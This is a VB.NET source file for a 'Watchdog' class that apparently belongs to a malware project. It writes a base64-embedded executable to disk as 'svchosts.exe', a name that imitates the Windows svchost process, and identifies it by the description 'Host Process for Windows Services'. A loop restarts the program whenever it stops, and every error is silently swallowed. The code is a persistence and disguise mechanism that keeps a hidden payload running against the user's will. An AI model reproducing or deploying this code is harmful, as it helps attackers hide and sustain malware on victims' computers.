Imports System.Diagnostics
Imports System.Windows.Forms
Imports System.Threading
Imports System.IO

Namespace Other
    Public Class Watchdog
        Public watchert As Integer = 0
        Public watchthread As Thread
        Public KeepRunning As Boolean = True
        Dim StartupPath As String = Application.StartupPath
        Public Sub StartWatchdogService()
            watchthread = New Thread(AddressOf CheckWatcher)
            watchthread.IsBackground = True
            watchthread.Start()
        End Sub
        Public Sub NewWatchdog(ByVal WatcherByte As String)
            Try
                If Not IO.File.Exists(Path.Combine(StartupPath, "svchosts.exe")) Then
                    IO.File.WriteAllBytes(Path.Combine(StartupPath, "svchosts.exe"), Convert.FromBase64String(WatcherByte))
                End If

                StartWatchdogService()
            Catch ex As Exception

            End Try
        End Sub
        Public Sub StopWatcher(ByVal DeleteWatcher As Boolean)
            Try

                Dim Watcher() As Process = System.Diagnostics.Process.GetProcessesByName(GetWatcher())
                For Each KillWatcher As Process In Watcher
                    KillWatcher.Kill()
                Next

                CheckWatcher()

                If DeleteWatcher = True Then
                    IO.File.Delete(Path.Combine(StartupPath, GetWatcher() & ".exe"))
                End If

            Catch ex As Exception

            End Try

            watchthread.Abort()
        End Sub
        Private Sub CheckWatcher()
            Try
                Do While KeepRunning = True
                    If (KeepRunning = True) Then
                        If Process.GetProcessesByName(GetWatcher()).Length > 0 Then

                        Else
                            Process.Start(Path.Combine(StartupPath, GetWatcher() & ".exe"))
                        End If
                    Else
                        Exit Do
                    End If
                Loop
            Catch ex As Exception

            End Try
        End Sub
        Public Function GetWatcher() As String
            Dim name As String = Nothing
            Dim WatchFile() As String = IO.Directory.GetFiles(Application.StartupPath)
            For Each file As String In WatchFile
                Dim a As New IO.FileInfo(file)
                If FileVersionInfo.GetVersionInfo(a.FullName).FileDescription = "Host Process for Windows Services" Then
                    name = a.Name.Split(".")(0)
                End If
            Next
            Return name
        End Function
    End Class
End Namespace